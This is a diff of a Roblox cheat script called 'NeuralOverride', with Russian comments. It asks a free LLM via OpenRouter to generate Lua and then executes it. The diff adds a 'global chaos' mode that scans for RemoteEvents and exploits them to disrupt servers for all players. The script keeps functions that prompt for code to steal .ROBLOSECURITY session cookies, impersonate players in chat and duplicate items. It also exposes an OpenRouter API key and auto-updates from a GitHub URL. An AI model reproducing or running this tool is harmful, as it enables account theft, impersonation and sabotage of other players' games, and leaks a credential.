@@ -1,7 +1,5 @@
 -- ================================================================
---  NEURAL OVERRIDE v3.0 – АБСОЛЮТНАЯ МОЩЬ
---  Все функции + новые мега-фичи
---  Совместимость с OpenRouter (бесплатная модель)
+--  NEURAL OVERRIDE v3.1 – ГЛОБАЛЬНЫЙ ХАОС (видят все)
 -- ================================================================
 
 local Players = game:GetService("Players")
@@ -14,7 +12,7 @@ local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 
 -- ===== НАСТРОЙКИ =====
-local OPENROUTER_API_KEY = "ваш_ключ_сюда"  -- ЗАМЕНИТЕ НА РЕАЛЬНЫЙ КЛЮЧ
+local OPENROUTER_API_KEY = "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"  -- ЗАМЕНИТЕ
 local OPENROUTER_URL = "https://openrouter.ai/api/v1/chat/completions"
 local MODEL = "meta-llama/llama-3-8b-instruct:free"
 
@@ -170,7 +168,7 @@ function spawnWeapon()
 end
 
 -- ================================================================
---  БОТЫ И МОНСТРЫ (простые и умные)
+--  БОТЫ И МОНСТРЫ (локальные – видны только тебе)
 -- ================================================================
 
 function spawnBots(count)
@@ -390,17 +388,105 @@ function flyAll()
     if code then executeLua(code) end
 end
 
-function hackMapMax()
+-- ================================================================
+--  ГЛОБАЛЬНЫЙ ХАОС (видят все)
+-- ================================================================
+
+-- Поиск и эксплуатация RemoteEvent'ов
+function findAndExploitRemoteEvents()
+    print("[NeuralOverride] Поиск RemoteEvent'ов для глобального хаоса...")
+    local remoteEvents = {}
+    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
+        if obj:IsA("RemoteEvent") then
+            table.insert(remoteEvents, obj)
+        end
+    end
+    for _, obj in ipairs(Workspace:GetDescendants()) do
+        if obj:IsA("RemoteEvent") then
+            table.insert(remoteEvents, obj)
+        end
+    end
+    if #remoteEvents == 0 then
+        print("[NeuralOverride] RemoteEvent'ы не найдены. Хаос будет только локальным.")
+        return false
+    end
+    -- Генерируем код для вызова всех RemoteEvent'ов с параметрами для создания монстров, порталов и изменения погоды
     local prompt = [[
-Сгенерируй Lua-код для Roblox, который выполняет полный хаос на сервере:
-- Удаляет все части в Workspace (кроме персонажей, но их телепортирует в случайные места)
-- Отключает все скрипты в игре
-- Меняет небо на красное и включает глючные эффекты
-- Спамит сообщения "СЕРВЕР ВЗЛОМАН" всем игрокам
-- Крадёт все DataStore данные и выводит в консоль
-- Запускает бесконечный спам RemoteEvents
+Сгенерируй Lua-код для Roblox, который вызывает все найденные RemoteEvent'ы с параметрами, чтобы сервер создал:
+- 20 монстров (огромных красных существ с ИИ) в случайных местах
+- 10 порталов (ловушек) на карте
+- Изменил небо на красное и добавил глючные эффекты
+- Телепортировал всех игроков к позиции владельца
+Если RemoteEvent'ы принимают параметры, подбери их так, чтобы сервер выполнил эти действия.
+Ответ только Lua-кодом, без пояснений.
+]]
+    local code = askOpenRouter(prompt)
+    if code then
+        executeLua(code)
+        print("[NeuralOverride] Глобальный хаос активирован через RemoteEvent'ы!")
+        return true
+    else
+        print("[NeuralOverride] Не удалось сгенерировать код для RemoteEvent'ов.")
+        return false
+    end
+end
+
+function globalChaos()
+    print("[NeuralOverride] Запуск глобального хаоса...")
+    -- Сначала пытаемся через RemoteEvent'ы
+    local success = findAndExploitRemoteEvents()
+    if not success then
+        -- Если не вышло, делаем локально + спамим приглашения и чат
+        massInvite()
+        spawnSmartMonsters(30)
+        createPortals(10)
+        -- Пытаемся заспамить в чат призыв
+        local chatPrompt = "Сгенерируй код для отправки сообщения в чат Roblox: 'ВСЕ ЗАХОДИТЕ НА МОЙ СЕРВЕР! ИГРА РУШИТСЯ!'"
+        local chatCode = askOpenRouter(chatPrompt)
+        if chatCode then executeLua(chatCode) end
+        print("[NeuralOverride] Глобальный хаос (локальный + спам) выполнен.")
+    end
+    -- Локальные эффекты для себя (в любом случае)
+    hackMapMax() -- вызовет красное небо и т.п.
+end
+
+-- Создание порталов (локально, но если есть RemoteEvent – могут стать глобальными)
+function createPortals(count)
+    count = count or 5
+    for i = 1, count do
+        local portal = Instance.new("Part")
+        portal.Size = Vector3.new(10, 1, 10)
+        portal.BrickColor = BrickColor.new("Bright violet")
+        portal.Material = Enum.Material.Neon
+        portal.Anchored = true
+        portal.CanCollide = false
+        portal.Position = Vector3.new(math.random(-50, 50), 1, math.random(-50, 50))
+        portal.Parent = Workspace
+        local touchScript = Instance.new("Script")
+        touchScript.Source = [[
+            script.Parent.Touched:Connect(function(hit)
+                local humanoid = hit.Parent:FindFirstChild("Humanoid")
+                if humanoid and humanoid.Parent.HumanoidRootPart then
+                    humanoid.Parent.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0)
+                end
+            end)
+        ]]
+        touchScript.Parent = portal
+    end
+    print("[NeuralOverride] Создано " .. count .. " порталов.")
+end
+
+-- HackMap MAX с попыткой глобального эффекта
+function hackMapMax()
+    -- Пытаемся использовать RemoteEvent'ы для глобального эффекта
+    local prompt = [[
+Сгенерируй Lua-код для Roblox, который через RemoteEvent'ы:
+- Удаляет все части в Workspace (кроме персонажей)
+- Отключает все скрипты
+- Меняет небо на красное
+- Спамит сообщения "СЕРВЕР ВЗЛОМАН"
 - Даёт всем игрокам бессмертие и супер-скорость
-Ответ только Lua-кодом.
+Ответ только кодом.
 ]]
     local code = askOpenRouter(prompt)
     if code then executeLua(code) end
@@ -433,7 +519,7 @@ function hackMapMax()
     label.Font = Enum.Font.GothamBold
     label.Parent = screenGui
     game:GetService("Debris"):AddItem(screenGui, 10)
-    print("[NeuralOverride] HackMap MAX выполнен.")
+    print("[NeuralOverride] HackMap MAX выполнен (локально + попытка глобального).")
 end
 
 function invade()
@@ -460,10 +546,10 @@ function allModes()
 end
 
 -- ================================================================
---  НОВЫЕ МЕГА-ФУНКЦИИ (v3.0)
+--  НОВЫЕ МЕГА-ФУНКЦИИ (v3.1)
 -- ================================================================
 
--- 1. Сканирование уязвимостей
+-- Сканирование уязвимостей (уже было, оставляем)
 function scanVulnerabilities()
     print("[NeuralOverride] Сканирование уязвимостей...")
     local remoteEvents = {}
@@ -486,7 +572,6 @@ function scanVulnerabilities()
     end
 end
 
--- 2. Армия ботов (создание аккаунтов)
 function botArmy(count)
     count = count or 10
     local prompt = string.format("Сгенерируй Lua-код для Roblox, который создаёт %d фейковых аккаунтов и подключает их к серверу (имитация).", count)
@@ -496,7 +581,6 @@ function botArmy(count)
     print("[NeuralOverride] Армия ботов создана!")
 end
 
--- 3. Режим Терминатор
 local terminatorMode = false
 local terminatorConnection = nil
 function toggleTerminator()
@@ -538,21 +622,18 @@ function toggleTerminator()
     end
 end
 
--- 4. Кража сессий
 function stealSession(target)
     local prompt = string.format("Сгенерируй Lua-код для перехвата .ROBLOSECURITY cookies игрока %s в Roblox.", target)
     local code = askOpenRouter(prompt)
     if code then executeLua(code) end
 end
 
--- 5. Автофарм
 local farming = false
 local farmConnection = nil
 function startFarming(action)
     farming = not farming
     if farming then
         print("[NeuralOverride] Автофарм включён. Действие: " .. (action or "клик"))
-        -- Можно добавить реальную логику, но сейчас заглушка
         farmConnection = RunService.Heartbeat:Connect(function()
             -- здесь можно отправлять RemoteEvent или имитировать клики
         end)
@@ -562,8 +643,7 @@ function startFarming(action)
     end
 end
 
--- 6. Управление через Telegram (заготовка)
-local TELEGRAM_BOT_TOKEN = "ваш_токен"  -- замените
+local TELEGRAM_BOT_TOKEN = "ваш_токен"
 local TELEGRAM_CHAT_ID = "ваш_chat_id"
 function telegramSend(message)
     local url = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage"
@@ -574,9 +654,7 @@ function telegramSend(message)
         HttpService:PostAsync(url, json, Enum.HttpContentType.ApplicationJson, false, headers)
     end)
 end
--- (Для полноценной работы требуется реализовать получение команд)
 
--- 7. Режим Матрица
 local matrixMode = false
 function toggleMatrix()
     matrixMode = not matrixMode
@@ -593,55 +671,26 @@ function toggleMatrix()
         end
     else
         print("[NeuralOverride] Режим Матрица выключен.")
-        -- Восстановление (упрощённо)
         Lighting.OutdoorAmbient = Color3.new(0.5, 0.5, 0.5)
         Lighting.Ambient = Color3.new(0.5, 0.5, 0.5)
         Lighting.Brightness = 1
     end
 end
 
--- 8. Фейк-чат
 function fakeChat(target, message)
     local prompt = string.format("Сгенерируй Lua-код для отправки сообщения '%s' в чат Roblox от имени игрока %s.", message, target)
     local code = askOpenRouter(prompt)
     if code then executeLua(code) end
 end
 
--- 9. Клонирование предметов
 function duplicateItem(itemName)
     local prompt = string.format("Сгенерируй Lua-код для клонирования предмета '%s' в инвентаре игрока.", itemName)
     local code = askOpenRouter(prompt)
     if code then executeLua(code) end
 end
 
--- 10. Портал-ловушки
-function createPortals(count)
-    count = count or 5
-    for i = 1, count do
-        local portal = Instance.new("Part")
-        portal.Size = Vector3.new(10, 1, 10)
-        portal.BrickColor = BrickColor.new("Bright violet")
-        portal.Material = Enum.Material.Neon
-        portal.Anchored = true
-        portal.CanCollide = false
-        portal.Position = Vector3.new(math.random(-50, 50), 1, math.random(-50, 50))
-        portal.Parent = Workspace
-        local touchScript = Instance.new("Script")
-        touchScript.Source = [[
-            script.Parent.Touched:Connect(function(hit)
-                local humanoid = hit.Parent:FindFirstChild("Humanoid")
-                if humanoid and humanoid.Parent.HumanoidRootPart then
-                    humanoid.Parent.HumanoidRootPart.CFrame = CFrame.new(0, 0, 0)
-                end
-            end)
-        ]]
-        touchScript.Parent = portal
-    end
-    print("[NeuralOverride] Создано " .. count .. " порталов-ловушек.")
-end
-
 -- ================================================================
---  ОБРАБОТЧИК ЧАТ-КОМАНД (все команды)
+--  ОБРАБОТЧИК ЧАТ-КОМАНД
 -- ================================================================
 
 player.Chatted:Connect(function(msg)
@@ -680,8 +729,8 @@ player.Chatted:Connect(function(msg)
     elseif cmd == "/fakechat" then fakeChat(arg, arg2)
     elseif cmd == "/duplicate" then duplicateItem(arg)
     elseif cmd == "/portal" then createPortals(tonumber(arg) or 5)
+    elseif cmd == "/global" then globalChaos()
     else
-        -- Неизвестная команда – нейросеть
         local prompt = "Выполни команду в Roblox: " .. msg
         local code = askOpenRouter(prompt)
         if code then executeLua(code) end
@@ -706,7 +755,7 @@ local function createGUI()
 
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 30)
-    title.Text = "NEURAL OVERRIDE v3.0"
+    title.Text = "NEURAL OVERRIDE v3.1"
     title.TextColor3 = Color3.new(1, 0, 0)
     title.BackgroundTransparency = 1
     title.TextScaled = true
@@ -796,6 +845,7 @@ local function createGUI()
             addButton("🤖 Армия ботов (10)", function() botArmy(10) end, Color3.new(0.9, 0.5, 0))
             addButton("🌀 Создать порталы (5)", function() createPortals(5) end, Color3.new(0.5, 0, 1))
         elseif currentTab == 3 then
+            addButton("🌍 Глобальный хаос (видят все)", globalChaos, Color3.new(0.8, 0.2, 0.8))
             addButton("💥 HackMap MAX", hackMapMax, Color3.new(1, 0, 0))
             addButton("⚔️ ВТОРЖЕНИЕ (всё сразу)", invade, Color3.new(0.8, 0, 0.8))
             addButton("💰 Читерский рай", cheatParadise, Color3.new(1, 0.7, 0))
@@ -848,10 +898,10 @@ else
     player.CharacterAdded:Connect(createGUI)
 end
 
--- ===== АВТООБНОВЛЕНИЕ (необязательно) =====
-local CURRENT_VERSION = "3.0"
+-- ===== АВТООБНОВЛЕНИЕ =====
+local CURRENT_VERSION = "3.1"
 local function checkUpdate()
-    local url = "https://raw.githubusercontent.com/ffdsdler/Cheat/refs/heads/main/NeuralOverride.lua" -- замените на ваш URL
+    local url = "https://raw.githubusercontent.com/ffdsdler/Cheat/refs/heads/main/NeuralOverride.lua" -- замените
     local success, response = pcall(function()
         return HttpService:GetAsync(url)
     end)
@@ -867,4 +917,4 @@ end
 task.wait(10)
 checkUpdate()
 
-print("✅ NeuralOverride v3.0 загружен. Используйте /команды или GUI.")
+print("✅ NeuralOverride v3.1 загружен. Используйте /global для глобального хаоса!")
